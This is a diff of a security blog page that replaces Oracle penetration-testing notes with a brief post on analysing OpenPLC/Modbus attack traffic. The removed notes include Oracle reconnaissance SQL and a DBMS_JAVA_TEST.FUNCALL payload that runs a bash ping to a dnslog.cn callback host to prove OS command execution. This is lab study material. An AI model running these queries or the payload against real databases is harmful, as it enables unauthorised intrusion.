@@ -14,12 +14,12 @@
 
 <!-- Open Graph metadata -->
 <meta property="og:type" content="website" />
-<meta property="og:title" content="随笔记：Oracle数据库的渗透测试 | ©「哨兵」| Sentry Security" />
+<meta property="og:title" content="《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》 | ©「哨兵」| Sentry Security" />
 <meta property="og:description" content="本站由哨兵安全实验室支持创办" />
 <meta property="og:image" content="http://localhost:80/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
-<meta property="og:url" content="http://localhost:80/blog/2020/Oracle-sql/" />
+<meta property="og:url" content="http://localhost:80/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/" />
 
-<title>随笔记：Oracle数据库的渗透测试 | ©「哨兵」| Sentry Security</title>
+<title>《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》 | ©「哨兵」| Sentry Security</title>
 
 <!-- Bootstrap core CSS -->
 <link href="/assets/css/bootstrap.css" rel="stylesheet">
@@ -70,84 +70,28 @@
         <! -- SINGLE POST -->
         <div class="col-lg-8">
             <! -- Blog Post  -->
-            <a href="/blog/2020/Oracle-sql/"><h3 class="ctitle">随笔记：Oracle数据库的渗透测试</h3></a>
-            <p><csmall>Oct 29, 2020. | By: Bin4xin</csmall></p>
+            <a href="/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-II/"><h3 class="ctitle">《基于Modbus协议与KingView实现Openplc仿真通讯（2）- 靶场攻击流量分析》</h3></a>
+            <p><csmall>May 7, 2021. | By: Bin4xin</csmall></p>
             <div class="post-content"> 
-            <p>使用docker进行oracle数据库渗透测试，环境如下：</p>
+            <h4 id="-wireshark流量分析"># <em>WireShark</em>流量分析</h4>
 
-<p><a href="https://www.jianshu.com/p/b30021a421b8">docker启动oracle</a></p>
+<p>网上已经有大佬上传wireshark流量文件，就不重复造轮子去流量了，直接下载下来对照poc代码分析看看：</p>
 
-<p>参考链接：<a href="https://www.freebuf.com/articles/web/5411.html">Oracle爆错手工注入</a></p>
+<ul>
+  <li><a href="https://github.com/sxd0216/attack-packets">点击下载：<em>sxd0216/attack-packets</em></a>
+    <ul>
+      <li>14、16帧为client向server请求流量，具体如下图：</li>
+      <li>15、17帧为server返回给client确认流量，具体流量可自行下载分析</li>
+    </ul>
+  </li>
+</ul>
 
-<p>渗透常用语句：</p>
+<p><img src="/assets/img/blog/2021/wireshark_tcp_show.png" alt="" /></p>
 
-<pre><code class="language-mysql">
-1 当前用户权限 
-select * from session_roles
-2 当前数据库版本 
-select banner from sys.v_$version where rownum=1
-3 服务器出口IP 
-用utl_http.request 可以实现
-4 服务器监听IP d
-select utl_inaddr.get_host_address from dual
-5 服务器操作系统
-select member from v$logfile where rownum=1
-6 服务器sid查询，远程连接的话需要
-select instance_name fromv$instance;
-7 当前连接用户
-select SYS_CONTEXT ('USERENV', 'CURRENT_USER')from dual
-</code></pre>
+<h4 id="-模拟攻击启停"># 模拟攻击启停</h4>
 
-<p>版本：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from v<span class="nv">$version</span><span class="p">;</span>
+<p><img src="/assets/img/blog/2021/OpenPLC_attack_success.gif" alt="" /></p>
 
-Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production
-PL/SQL Release 11.2.0.4.0 - Production
-CORE	11.2.0.4.0	Production
-TNS <span class="k">for </span>Linux: Version 11.2.0.4.0 - Production
-NLSRTL Version 11.2.0.4.0 - Production
-
-</code></pre></div></div>
-<p>oracleShell.jar环境</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - Production
-PL/SQL Release 11.2.0.1.0 - Production
-<span class="s2">"CORE	11.2.0.1.0	Production"</span>
-TNS <span class="k">for </span>32-bit Windows: Version 11.2.0.1.0 - Production
-NLSRTL Version 11.2.0.1.0 - Production
-</code></pre></div></div>
-
-<p>select utl_inaddr.get_host_address from dual</p>
-
-<p>172.17.0.2</p>
-
-<p>补丁：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from dba_registry_history<span class="p">;</span>
-
-
-2018-04-25 12:22:17.105985	APPLY	SERVER	11.2.0.4	0	PSU	Patchset 11.2.0.2.0
-</code></pre></div></div>
-<p>权限：</p>
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">select</span> <span class="k">*</span> from session_roles<span class="p">;</span>
-
-CONNECT
-RESOURCE
-DBA
-SELECT_CATALOG_ROLE
-HS_ADMIN_SELECT_ROLE
-EXECUTE_CATALOG_ROLE
-HS_ADMIN_EXECUTE_ROLE
-DELETE_CATALOG_ROLE
-EXP_FULL_DATABASE
-IMP_FULL_DATABASE
-DATAPUMP_EXP_FULL_DATABASE
-DATAPUMP_IMP_FULL_DATABASE
-GATHER_SYSTEM_STATISTICS
-SCHEDULER_ADMIN
-WM_ADMIN_ROLE
-</code></pre></div></div>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Select DBMS_JAVA_TEST.FUNCALL<span class="o">(</span><span class="s1">'oracle/aurora/util/Wrapper'</span>,<span class="s1">'main'</span>,<span class="s1">'/bin/bash'</span>,<span class="s1">'-c'</span>,<span class="s1">'ping ojuht0.dnslog.cn'</span><span class="o">)</span> from dual<span class="p">;</span>
-</code></pre></div></div>
 
             </div>
             <div class="spacing"></div>
@@ -170,7 +114,7 @@ WM_ADMIN_ROLE
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> 漏洞复现</a>
-            <span class="badge badge-theme pull-right">12</span>
+            <span class="badge badge-theme pull-right">14</span>
         </p>
     
         <p>
@@ -190,7 +134,7 @@ WM_ADMIN_ROLE
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> 笔记</a>
-            <span class="badge badge-theme pull-right">40</span>
+            <span class="badge badge-theme pull-right">44</span>
         </p>
     
         <p>
@@ -205,7 +149,7 @@ WM_ADMIN_ROLE
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> 主动防御</a>
-            <span class="badge badge-theme pull-right">1</span>
+            <span class="badge badge-theme pull-right">2</span>
         </p>
     
         <p>
@@ -265,7 +209,7 @@ WM_ADMIN_ROLE
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> Sql-inject</a>
-            <span class="badge badge-theme pull-right">3</span>
+            <span class="badge badge-theme pull-right">2</span>
         </p>
     
         <p>
@@ -280,7 +224,7 @@ WM_ADMIN_ROLE
     
         <p>
             <a href=""><i class="fa fa-angle-right"></i> 信息搜集</a>
-            <span class="badge badge-theme pull-right">7</span>
+            <span class="badge badge-theme pull-right">8</span>
         </p>
     
         <p>
@@ -312,7 +256,7 @@ WM_ADMIN_ROLE
         
             <a class="btn btn-theme" href="" role="button">Web (12)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">漏洞复现 (12)</a>	         
+            <a class="btn btn-theme" href="" role="button">漏洞复现 (14)</a>	         
         
             <a class="btn btn-theme" href="" role="button">渗透 (10)</a>	         
         
@@ -320,13 +264,13 @@ WM_ADMIN_ROLE
         
             <a class="btn btn-theme" href="" role="button">安全工具 (6)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">笔记 (40)</a>	         
+            <a class="btn btn-theme" href="" role="button">笔记 (44)</a>	         
         
             <a class="btn btn-theme" href="" role="button">软件移植 (2)</a>	         
         
             <a class="btn btn-theme" href="" role="button">Arm (1)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">主动防御 (1)</a>	         
+            <a class="btn btn-theme" href="" role="button">主动防御 (2)</a>	         
         
             <a class="btn btn-theme" href="" role="button">技巧 (3)</a>	         
         
@@ -350,13 +294,13 @@ WM_ADMIN_ROLE
         
             <a class="btn btn-theme" href="" role="button">Cve (9)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">Sql-inject (3)</a>	         
+            <a class="btn btn-theme" href="" role="button">Sql-inject (2)</a>	         
         
             <a class="btn btn-theme" href="" role="button">Bash (2)</a>	         
         
             <a class="btn btn-theme" href="" role="button">内网 (1)</a>	         
         
-            <a class="btn btn-theme" href="" role="button">信息搜集 (7)</a>	         
+            <a class="btn btn-theme" href="" role="button">信息搜集 (8)</a>	         
         
             <a class="btn btn-theme" href="" role="button">Fuzz (1)</a>	         
         
